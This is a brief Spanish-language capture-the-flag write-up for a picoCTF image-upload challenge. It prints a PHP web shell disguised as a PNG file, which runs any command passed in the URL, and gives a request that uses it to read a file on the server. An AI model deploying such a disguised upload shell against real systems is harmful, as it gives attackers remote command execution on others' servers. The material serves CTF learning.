#### Descripción 
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:53576/)!
#### Solución
```
Explorar las carpetas con vulnerabilidades en la barra de búsqueda
http://atlas.picoctf.net:53576/uploads/webshell.png.php?cmd=cat%20../MFRDAZLDMUYDG.txt

PNG
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>

para terner permisos.
```
#### Notas
#### Referencias

